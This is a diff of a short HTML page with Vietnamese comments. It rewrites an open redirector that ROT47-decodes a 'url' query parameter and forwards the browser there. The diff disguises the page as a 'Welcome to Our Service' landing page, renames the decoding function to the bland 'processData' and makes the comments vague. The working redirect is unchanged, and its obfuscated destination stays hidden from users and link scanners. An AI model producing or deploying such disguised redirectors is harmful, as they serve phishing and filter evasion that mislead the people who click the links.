@@ -2,33 +2,35 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
+    <title>Welcome to Our Service</title>
 </head>
 <body>
-    <p>Redirecting to your destination...</p>
+    <h1>Welcome to Our Service</h1>
+    <p>Loading your personalized content...</p>
+    
     <script>
-        function rot47Decode(str) {
-            let decoded = '';
-            for (let i = 0; i < str.length; i++) {
-                let charCode = str.charCodeAt(i);
-                if (charCode >= 33 && charCode <= 126) {
-                    decoded += String.fromCharCode((charCode - 33 - 47 + 94) % 94 + 33);
+        function processData(input) {
+            let result = '';
+            for (let i = 0; i < input.length; i++) {
+                let code = input.charCodeAt(i);
+                if (code >= 33 && code <= 126) {
+                    result += String.fromCharCode((code - 33 - 47 + 94) % 94 + 33);
                 } else {
-                    decoded += str[i];
+                    result += input[i];
                 }
             }
-            return decoded;
+            return result;
         }
 
-        // Lấy tham số 'url' từ query string
-        const urlParams = new URLSearchParams(window.location.search);
-        const encodedUrl = urlParams.get('url') || ''; // Chuỗi mã hóa từ URL
+        // Xử lý tham số đầu vào
+        const params = new URLSearchParams(window.location.search);
+        const data = params.get('url') || '';
 
-        if (encodedUrl) {
-            const decodedUrl = rot47Decode(encodedUrl); // Giải mã ROT47
-            window.location.href = decodedUrl; // Chuyển hướng
+        if (data) {
+            const processed = processData(data);
+            window.location.href = processed;
         } else {
-            document.body.innerHTML = "<p>Error: No URL provided.</p>";
+            document.body.innerHTML = "<p>Sorry, we couldn't load your content.</p>";
         }
     </script>
 </body>
